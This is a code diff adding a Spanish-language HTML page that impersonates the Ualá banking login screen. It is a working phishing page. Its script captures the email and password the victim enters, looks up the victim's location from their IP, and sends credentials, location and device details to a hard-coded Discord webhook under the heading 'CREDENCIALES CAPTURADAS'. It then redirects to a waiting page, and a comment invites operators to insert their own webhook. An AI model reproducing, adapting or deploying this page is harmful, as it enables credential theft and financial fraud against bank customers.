@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login Ualá</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text",
+        system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+
+    body {
+      background-color: #ffffff;
+      color: #1b1f3b;
+    }
+
+    .screen {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #ffffff;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      padding: 32px 20px 32px;
+      margin: 0 auto;
+    }
+
+    .logo-wrap {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 44px;
+      margin-top: 0;
+    }
+
+    .logo-wrap img {
+      width: 120px;
+      height: 120px;
+      object-fit: contain;
+    }
+
+    .title {
+      text-align: center;
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 4px;
+    }
+
+    .subtitle {
+      text-align: center;
+      font-size: 14px;
+      color: #6b7280;
+      margin-bottom: 36px;
+    }
+
+    .label {
+      font-size: 13px;
+      color: #6b7280;
+      margin-bottom: 8px;
+    }
+
+    .input-row {
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #e5e7eb;
+      padding: 6px 0 8px;
+      margin-bottom: 4px;
+    }
+
+    .input-row input {
+      border: none;
+      outline: none;
+      width: 100%;
+      font-size: 15px;
+      color: #111827;
+      padding: 3px 0;
+    }
+
+    .input-row input::placeholder {
+      color: #9ca3af;
+    }
+
+    .helper {
+      height: 20px;
+      font-size: 12px;
+      color: #ef4444;
+      margin-bottom: 4px;
+      visibility: hidden;
+    }
+
+    .footer-legal {
+      margin-top: 32px;
+      font-size: 11px;
+      text-align: center;
+      color: #9ca3af;
+    }
+
+    .footer-legal a {
+      color: #1d4ed8;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .footer-legal a:hover {
+      text-decoration: underline;
+    }
+
+    .buttons {
+      margin-top: 16px;
+    }
+
+    .btn-primary,
+    .btn-outline {
+      width: 100%;
+      border-radius: 999px;
+      padding: 14px 0;
+      font-size: 16px;
+      font-weight: 500;
+      border: none;
+      cursor: pointer;
+      transition: background-color 0.15s ease, color 0.15s ease,
+        box-shadow 0.15s ease;
+      position: relative;
+    }
+
+    .btn-primary {
+      background-color: #0046ff;
+      color: #ffffff;
+      box-shadow: 0 4px 10px rgba(0, 70, 255, 0.35);
+      margin-bottom: 12px;
+    }
+
+    .btn-primary:active {
+      background-color: #0039cc;
+      box-shadow: 0 2px 6px rgba(0, 70, 255, 0.35);
+    }
+
+    .btn-primary:disabled {
+      background-color: #9ca3af;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+
+    .btn-outline {
+      background-color: #ffffff;
+      color: #0046ff;
+      border: 1px solid #0046ff;
+    }
+
+    .btn-outline:active {
+      background-color: #e0ebff;
+    }
+
+    .loading {
+      display: none;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 20px;
+      height: 20px;
+      border: 2px solid #ffffff40;
+      border-top: 2px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: translate(-50%, -50%) rotate(0deg); }
+      100% { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+
+    @media (max-height: 640px) {
+      .container {
+        padding-top: 16px;
+      }
+
+      .logo-wrap {
+        margin-bottom: 32px;
+      }
+
+      .subtitle {
+        margin-bottom: 28px;
+      }
+
+      .footer-legal {
+        margin-top: 24px;
+      }
+    }
+
+    .input-row.focused {
+      border-bottom-color: #0046ff;
+      box-shadow: 0 1px 0 0 #0046ff;
+    }
+  </style>
+</head>
+<body>
+  <div class="screen">
+    <div class="container">
+      <!-- NUEVO LOGO -->
+      <div class="logo-wrap">
+        <img
+          src="https://developers.ualabis.com.ar/logo-large.png"
+          alt="Logo Ualá"
+        />
+      </div>
+
+      <h1 class="title">¡Que bueno que estés aquí!</h1>
+      <p class="subtitle">Ingresa tus datos para iniciar sesión</p>
+
+      <div class="label">Correo electrónico</div>
+      <div class="input-row" data-field="email">
+        <input
+          type="email"
+          id="email"
+          placeholder="usuario@ejemplo.com"
+          autocomplete="email"
+        />
+      </div>
+      <div id="emailHelper" class="helper">Correo inválido</div>
+
+      <div class="label">Clave</div>
+      <div class="input-row" data-field="password">
+        <input
+          type="password"
+          id="password"
+          placeholder="••••••••"
+          autocomplete="current-password"
+        />
+      </div>
+      <div id="passHelper" class="helper">La clave es obligatoria</div>
+
+      <div class="footer-legal">
+        Protegido por reCAPTCHA -
+        <a href="#">Privacidad</a> -
+        <a href="#">Condiciones</a>
+      </div>
+
+      <div class="buttons">
+        <button class="btn-primary" id="btnContinuar">
+          <span>Continuar</span>
+          <div class="loading"></div>
+        </button>
+        <button class="btn-outline">Abre tu cuenta gratis</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const emailInput = document.getElementById("email");
+    const passInput = document.getElementById("password");
+    const emailHelper = document.getElementById("emailHelper");
+    const passHelper = document.getElementById("passHelper");
+    const btnContinuar = document.getElementById("btnContinuar");
+    const btnText = btnContinuar.querySelector("span");
+    const loadingSpinner = btnContinuar.querySelector(".loading");
+
+    // DISCORD WEBHOOK - CAMBIA ESTA URL POR LA TUYA
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1460726206096736376/_rBHWA7GiNQt5m-kgbM4vfgh36xI9lolfGupc0zSFfKyowHtqXXp_LmYZS2niIFLvCat"; // ← ← ← ← ← ← ← ← ← ← ← ←
+
+    function saveToLocalStorage(key, data) {
+      localStorage.setItem(key, JSON.stringify(data));
+    }
+
+    function getFromLocalStorage(key) {
+      try {
+        return JSON.parse(localStorage.getItem(key));
+      } catch {
+        return null;
+      }
+    }
+
+    document.querySelectorAll(".input-row input").forEach((input) => {
+      input.addEventListener("focus", () => {
+        input.parentElement.classList.add("focused");
+      });
+      input.addEventListener("blur", () => {
+        input.parentElement.classList.remove("focused");
+      });
+    });
+
+    const savedData = getFromLocalStorage("uala_login");
+    if (savedData) {
+      emailInput.value = savedData.email || "";
+      passInput.value = savedData.password || "";
+    }
+
+    btnContinuar.addEventListener("click", async function () {
+      let valid = true;
+
+      const email = emailInput.value.trim();
+      const pass = passInput.value.trim();
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (!emailRegex.test(email)) {
+        emailHelper.style.visibility = "visible";
+        emailHelper.textContent = "Ingresa un correo válido";
+        valid = false;
+      } else {
+        emailHelper.style.visibility = "hidden";
+      }
+
+      if (pass.length === 0) {
+        passHelper.style.visibility = "visible";
+        passHelper.textContent = "La clave es obligatoria";
+        valid = false;
+      } else {
+        passHelper.style.visibility = "hidden";
+      }
+
+      if (!valid) return;
+
+      saveToLocalStorage("uala_login", { email, password: pass });
+
+      btnContinuar.disabled = true;
+      btnText.style.opacity = "0";
+      loadingSpinner.style.display = "block";
+
+      try {
+        const userAgent = navigator.userAgent;
+        const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+
+        // Mensaje Discord SIN lat/lon
+        const message = {
+          embeds: [{
+            title: "🟣 **UALÁ - CREDENCIALES CAPTURADAS** 🟣",
+            description: "```Nuevo login interceptado```",
+            color: 0x5865F2,
+            fields: [
+              {
+                name: "📧 **Correo Electrónico**",
+                value: `\`${email}\``,
+                inline: false
+              },
+              {
+                name: "🔐 **Contraseña**",
+                value: `\`${pass}\``,
+                inline: false
+              },
+              {
+                name: "🌍 **Ubicación**",
+                value: ipData.city ? `${ipData.city}, ${ipData.country_name}` : "No disponible",
+                inline: true
+              },
+              {
+                name: "💻 **Dispositivo**",
+                value: `\`${userAgent.slice(0, 80)}...\``,
+                inline: false
+              }
+            ],
+            footer: {
+              text: " @Brknshinexxx | Ualá ",
+              icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/82/Telegram_logo.svg/500px-Telegram_logo.svg.png"
+            },
+            timestamp: new Date().toISOString()
+          }]
+        };
+
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message)
+        });
+
+        // REDIRECCIONA A wait.html
+        setTimeout(() => {
+          window.location.href = "wait.html";
+        }, 1500);
+
+      } catch (error) {
+        console.error('Error:', error);
+        setTimeout(() => {
+          window.location.href = "wait.html";
+        }, 1000);
+      } finally {
+        btnContinuar.disabled = false;
+        btnText.style.opacity = "1";
+        loadingSpinner.style.display = "none";
+      }
+    });
+  </script>
+</body>
+</html>
